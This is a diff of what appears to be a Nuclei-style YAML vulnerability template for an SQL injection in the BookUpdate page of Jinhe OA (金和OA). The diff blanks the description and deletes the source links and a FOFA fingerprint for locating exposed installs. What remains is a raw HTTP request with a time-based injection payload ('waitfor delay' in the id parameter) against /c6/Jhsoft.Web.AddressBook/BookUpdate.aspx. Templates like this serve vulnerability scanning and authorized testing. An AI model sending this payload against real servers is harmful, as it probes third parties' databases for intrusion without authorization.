@@ -3,12 +3,8 @@ info:
   name: 金和OA BookUpdate存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/egxat933wnh3gtok'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: egxat933wnh3gtok
-    fofa: app="金和网络-金和OA"
 http:
 - raw:
   - 'GET /c6/Jhsoft.Web.AddressBook/BookUpdate.aspx/?id=1%27waitfor+delay%270%3A0%3A5%27-- HTTP/1.1
